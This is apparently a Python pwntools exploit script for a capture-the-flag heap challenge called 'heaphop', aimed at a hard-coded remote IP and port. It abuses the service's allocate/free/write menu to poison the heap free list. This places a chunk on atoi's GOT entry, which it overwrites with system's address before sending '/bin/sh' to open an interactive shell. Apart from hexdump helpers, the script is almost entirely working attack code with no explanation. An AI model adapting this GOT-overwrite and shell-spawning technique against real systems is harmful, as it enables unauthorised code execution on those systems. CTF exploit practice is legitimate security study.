#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='heaphop'
TIME=0.02
if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59995
else:
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='89.38.210.128'
    port=1339

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s


def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "


def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))



def waitmenu():
    return(p.recvuntil(">"))

def alloc():
    p.sendline("1")
    return(waitmenu())

def free():
    p.sendline("4")
    return(waitmenu())

def ecrit(s):
    p.sendline("2")
    p.send(s+chr(4))
    return(waitmenu())

def lit():
    p.sendline("3")
    return(waitmenu())

p=remote(host,port)

waitmenu()
alloc()
free()
ecrit(p64(elf.got['atoi']))
alloc()
alloc()
b=lit()
b=b[1:65]
dumpg(0,b)
#reference_libc='atoi'
#adr_reference_libc=bword(b[0:8])
#shell=p64(tolibc('system'))
shell=p64(elf.plt['system'])
pause()
ecrit(shell)
p.sendline("/bin/sh")
p.interactive()
